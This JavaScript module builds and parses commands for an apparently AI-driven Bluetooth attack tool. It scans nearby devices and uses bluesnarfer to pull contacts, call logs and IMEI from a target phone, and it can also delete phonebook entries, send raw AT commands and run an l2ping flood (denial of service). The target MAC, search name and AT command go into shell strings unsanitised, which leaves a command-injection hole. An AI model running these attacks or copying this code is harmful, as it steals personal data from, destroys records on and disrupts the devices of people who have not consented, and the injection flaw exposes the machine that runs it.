// Bluetooth attack + recon command builders and parsers.
//
// Powers the ```bluetooth agent tool. Discovers nearby Bluetooth devices, enumerates their services, and runs
// **bluesnarfer** to pull data (device info, phonebook/contacts, dialed/received/missed call lists) from a
// selected device over OBEX/AT — the classic BlueSnarf attack.
//
// HARDWARE REALITY (same as Wi-Fi): Bluetooth attacks need a REAL BT radio physically near the target,
// attached to the machine that runs the exec backend. There is NO software substitute. A cloud/Windows-WSL
// container has no radio. So every action auto-DETECTS the hci adapter and, if none exists, prints a clear
// BT-NOADAPTER message and exits — the tool tells the truth instead of letting the model invent devices.
// This is exactly what makes it "just work" on the planned desktop build (exec on the user's real machine).

// Install bluesnarfer if it isn't already on PATH (apt package, else compile from source).
const ENSURE_BLUESNARFER =
  'command -v bluesnarfer >/dev/null 2>&1 || { ' +
  'apt-get update -y >/dev/null 2>&1; ' +
  'apt-get install -y bluesnarfer bluez bluez-tools libbluetooth-dev >/dev/null 2>&1 || ' +
  '{ apt-get install -y git build-essential libbluetooth-dev >/dev/null 2>&1; ' +
  'git clone https://github.com/kimbo/bluesnarfer /tmp/bluesnarfer >/dev/null 2>&1; ' +
  'make -C /tmp/bluesnarfer >/dev/null 2>&1 && cp /tmp/bluesnarfer/bluesnarfer /usr/local/bin/; }; }; ';

const ENSURE_BLUEZ =
  'command -v hcitool >/dev/null 2>&1 || apt-get install -y bluez bluez-tools >/dev/null 2>&1; ';

// Clear, actionable message when there's no BT radio (marker BT-NOADAPTER so the handler can surface it).
const NO_ADAPTER_MSG =
  'BT-NOADAPTER: No Bluetooth adapter on this exec backend (no hciN device). Bluetooth recon/snarf needs a ' +
  'REAL Linux BT radio physically near the target, attached to the machine running the exec backend. On ' +
  'Windows+Docker none is available (the host Bluetooth is NOT passed into the WSL2/Docker VM) — this is a ' +
  'hardware limit, not a bug, and any device/contact list without a real adapter would be fabricated. Fix: ' +
  'run on bare-metal Kali / the desktop app, or set EXEC_BACKEND=ssh to a Kali box with a USB/onboard adapter.';

// Auto-detect the first hci interface into $HCI (so it works on hci0, hci1, a USB dongle, … on any machine),
// bail out honestly if none, then bring the radio up.
const REQUIRE_ADAPTER =
  'HCI=$(hciconfig 2>/dev/null | grep -oE "^hci[0-9]+" | head -1); ' +
  `if [ -z "$HCI" ]; then echo ${JSON.stringify(NO_ADAPTER_MSG)}; exit 3; fi; ` +
  'hciconfig "$HCI" up >/dev/null 2>&1; rfkill unblock bluetooth >/dev/null 2>&1; ';

const VALID_TYPES = ['DC', 'SM', 'RC', 'MC', 'ME', 'FD', 'LD']; // phonebook memory storages

// Build a command for a high-level Bluetooth action.
//   action: check|scan|lescan|info|services|ping|info-snarf|contacts|calls|search|delete|list-storage|custom|flood
//   mac    : target BD_ADDR (AA:BB:CC:DD:EE:FF)
//   chan   : RFCOMM channel for bluesnarfer (default 3; find the real one via `services`)
//   range  : phonebook entry range, e.g. "1-100"
//   type   : phonebook memory storage (DC dialed / RC received / MC missed / SM SIM / ME phone)
//   name   : name to search for in the phonebook (search action)
//   atcmd  : raw AT+ command (custom action)
export function buildBluetoothCommand({ action, mac, chan = 3, range = '1-100', type, name, atcmd } = {}) {
  const T = VALID_TYPES.includes(String(type || '').toUpperCase()) ? String(type).toUpperCase() : null;
  // bluesnarfer base (auto-detected adapter already up via REQUIRE_ADAPTER)
  const snarf = (extra) =>
    ENSURE_BLUESNARFER + REQUIRE_ADAPTER + `echo "[*] bluesnarfer -> ${mac} (ch ${chan})"; bluesnarfer -b ${mac} -C ${chan} ${extra}`;
  const needMac = (fn) => (mac ? fn() : 'echo "BT-USAGE: this action needs a target BD_ADDR (MAC) — run ```bluetooth scan first."'.replace('```', ''));

  switch (action) {
    case 'check':
      // Preflight — report adapter status clearly (run this before scanning a new backend).
      return ENSURE_BLUEZ +
        'rfkill unblock bluetooth >/dev/null 2>&1; ' +
        'HCI=$(hciconfig 2>/dev/null | grep -oE "^hci[0-9]+" | head -1); ' +
        'if [ -n "$HCI" ]; then echo "[+] Bluetooth adapter present: $HCI"; hciconfig "$HCI" -a; ' +
        `else echo ${JSON.stringify(NO_ADAPTER_MSG)}; fi`;
    case 'scan':
      return ENSURE_BLUEZ + REQUIRE_ADAPTER + 'hcitool -i "$HCI" scan --flush';
    case 'lescan':
      return ENSURE_BLUEZ + REQUIRE_ADAPTER + 'timeout 15 hcitool -i "$HCI" lescan || true';
    case 'info':
      return needMac(() => ENSURE_BLUEZ + REQUIRE_ADAPTER + `hcitool -i "$HCI" info ${mac}; sdptool browse ${mac} 2>/dev/null | head -40`);
    case 'services':
      return needMac(() => ENSURE_BLUEZ + REQUIRE_ADAPTER + `sdptool browse ${mac}`);
    case 'ping':
      return needMac(() => ENSURE_BLUEZ + REQUIRE_ADAPTER + `l2ping -c 5 ${mac}`);
    case 'info-snarf':
      return needMac(() => snarf('-i'));
    case 'snarf':
    case 'contacts':
      // Read phonebook (contacts). Optional storage TYPE (e.g. SM = SIM, ME = phone memory).
      return needMac(() => snarf(`${T ? `-s ${T} ` : ''}-r ${range}`));
    case 'calls':
      // Call list — default missed calls (MC); pass DC (dialed) / RC (received) via type.
      return needMac(() => snarf(`-s ${T || 'MC'} -r ${range}`));
    case 'search':
      // Search the phonebook for a name.
      return needMac(() => (name ? snarf(`-f "${name}"`) : 'echo "BT-USAGE: search needs a name (bluetooth search <mac> <chan> <name>)."'));
    case 'delete':
      // Delete phonebook entries N-M (destructive).
      return needMac(() => snarf(`-w ${range}`));
    case 'list-storage':
      // List available phonebook memory storages on the device.
      return needMac(() => snarf('-l'));
    case 'custom':
      // Send a raw AT+ command.
      return needMac(() => (atcmd ? snarf(`-c '${atcmd}'`) : 'echo "BT-USAGE: custom needs an AT command (bluetooth custom <mac> <chan> <AT+...>)."'));
    case 'flood':
      // BlueSmack-style L2CAP flood (DoS) — parity with the wireless deauth action.
      return needMac(() => ENSURE_BLUEZ + REQUIRE_ADAPTER + `l2ping -i "$HCI" -s 600 -f ${mac}`);
    default:
      return ENSURE_BLUEZ + REQUIRE_ADAPTER + 'hcitool -i "$HCI" scan --flush';
  }
}

// True if the output shows there's no BT radio (so the handler can surface the honest message, not findings).
export function isNoBtAdapter(output) {
  return /BT-NOADAPTER|No such device|Device not found|Can't init device|hci_open_dev/i.test(String(output || ''));
}

// Parse `hcitool scan` output -> device findings (MAC + name).
export function parseBtScan(text, source = 'hcitool') {
  const out = [];
  for (const raw of String(text).split('\n')) {
    const m = /([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+(.+)$/i.exec(raw.trim());
    if (m && !/scanning|inquiry/i.test(raw)) {
      out.push({
        finding_type: 'bluetooth', severity: 'info',
        title: `Bluetooth device: ${m[2].trim()} (${m[1]})`,
        host: m[1].toUpperCase(), evidence: raw.trim().slice(0, 160), source,
      });
    }
  }
  return out;
}

// Parse bluesnarfer output -> contact / call / device-info findings.
export function parseBluesnarfer(text, source = 'bluesnarfer') {
  const out = [];
  const t = String(text);
  // phonebook entries:  name : "John", number : "+1555..."
  const entry = /name\s*:\s*"?([^",\n]+)"?\s*,?\s*(?:number|tel)?\s*:?\s*"?([+\d][\d\s\-()]{4,})?/gi;
  let m;
  const seen = new Set();
  while ((m = entry.exec(t)) !== null) {
    const name = (m[1] || '').trim();
    const num = (m[2] || '').trim();
    if (!name && !num) continue;
    const key = name + '|' + num;
    if (seen.has(key)) continue; seen.add(key);
    out.push({
      finding_type: 'bluetooth', severity: 'high',
      title: `Contact/call exfiltrated: ${name || '(no name)'}${num ? ' — ' + num : ''}`,
      evidence: m[0].slice(0, 160), source,
      remediation: 'The target device exposed its phonebook/call logs over Bluetooth (BlueSnarf). Disable OBEX/AT access, turn off discoverable mode, and patch the device — this is sensitive PII exfiltration.',
    });
  }
  // device info from -i (manufacturer / model / IMEI)
  const dn = /device name\s*:\s*(.+)/i.exec(t)?.[1]?.trim();
  if (dn) out.push({ finding_type: 'bluetooth', severity: 'medium', title: `Bluetooth device info leaked: ${dn}`, evidence: t.slice(0, 160), source });
  const imei = /\b(IMEI|serial)\s*:?\s*([0-9]{10,17})/i.exec(t);
  if (imei) out.push({ finding_type: 'bluetooth', severity: 'high', title: `Device ${imei[1].toUpperCase()} leaked: ${imei[2]}`, evidence: imei[0], source });
  const manu = /manufacturer\s*:\s*(.+)/i.exec(t)?.[1]?.trim();
  if (manu) out.push({ finding_type: 'bluetooth', severity: 'info', title: `Device manufacturer: ${manu}`, evidence: manu.slice(0, 80), source });
  return out;
}

export function extractBluetoothFindings(command, output) {
  if (!/hcitool|bluesnarfer|l2ping|sdptool/i.test(command) || !output) return [];
  if (isNoBtAdapter(output)) return []; // never manufacture findings when there's no radio
  return [...parseBtScan(output), ...parseBluesnarfer(output)];
}
